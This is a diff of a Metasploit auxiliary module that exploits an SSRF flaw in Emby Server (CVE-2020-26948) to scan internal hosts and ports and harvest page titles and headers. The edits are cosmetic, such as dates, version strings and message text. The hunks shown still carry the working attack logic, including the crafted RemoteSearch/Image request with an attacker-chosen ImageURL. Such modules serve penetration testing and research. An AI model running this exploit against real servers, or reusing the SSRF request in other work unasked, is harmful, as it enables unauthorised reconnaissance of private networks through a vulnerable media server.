@@ -2,7 +2,7 @@
 # This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/btnz-k/msf_emby
 # Exploit Title: Emby SSRF HTTP Scanner
-# Date: 2020.11.17
+# Date: 2021.03.01
 # Exploit Author: Btnz
 # Vendor Homepage: https://emby.media/
 # Software Link: https://emby.media/download.html
@@ -12,7 +12,7 @@
 ##
 # frozen_string_literal: true
 
-#MSF Auxiliary Class
+# MSF Auxiliary Class
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Exploit::Capture
@@ -27,7 +27,7 @@ class MetasploitModule < Msf::Auxiliary
       title tag from internal websites. Based on the vulnerability CVE-2020-26948.
       ',
       'Author' => 'Btnz',
-      'Version' => '1.0.2020.11.17.01',
+      'Version' => '1.0.2021.03.01.01',
       'License' => MSF_LICENSE
     )
 
@@ -35,7 +35,7 @@ class MetasploitModule < Msf::Auxiliary
 
     register_options(
       [
-        OptBool.new('STORE_NOTES', [true, 'Store the captured information in notes. Use "notes -t http.title" to view', true]),
+        OptBool.new('STORE_NOTES', [true, 'Store the information in notes. Use "notes -t http.title" to view', true]),
         OptBool.new('SHOW_TITLES', [true, 'Show the titles on the console as they are grabbed', true]),
         OptString.new('EMBY_SERVER', [true, 'IP to scan (eg 10.10.10.18))', '']),
         OptInt.new('EMBY_PORT', [true, 'Web UI port for Emby Server (e.g. 8096)', '8096']),
@@ -51,7 +51,7 @@ class MetasploitModule < Msf::Auxiliary
 
     # loop through the IPs
     dports.each do |p|
-      vprint_status("Attempting http://#{datastore['EMBY_SERVER']}:#{datastore['EMBY_PORT']}/Items/RemoteSearch/Image?ProviderName=TheMovieDB&ImageURL=http://#{target_host}:#{p}")
+      vprint_status("Attempting SSRF with target http://#{target_host}:#{p}")
       uri = "/Items/RemoteSearch/Image?ProviderName=TheMovieDB&ImageURL=http://#{target_host}:#{p}"
 
       res = Net::HTTP.get_response(datastore['EMBY_SERVER'], uri, datastore['EMBY_PORT'])
@@ -94,7 +94,7 @@ class MetasploitModule < Msf::Auxiliary
           print_good("#{target_host}:#{p} [C:#{res.code}] [R:#{location_header}] [S:#{server_header}] #{rx_title}")
         end
         if datastore['STORE_NOTES']
-          notedata = { code: res.code, port: p, server: server_header, title: rx_title, redirect: location_header } # , uri: datastore['EMBY_SERVER'] }
+          notedata = { code: res.code, port: p, server: server_header, title: rx_title, redirect: location_header }
           report_note(host: target_host, port: p, type: 'http.title', data: notedata, update: :unique_data)
         end
       else
@@ -102,7 +102,5 @@ class MetasploitModule < Msf::Auxiliary
         next
       end
     end
-  #rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
-  #rescue ::Timeout::Error, ::Errno::EPIPE
   end
 end
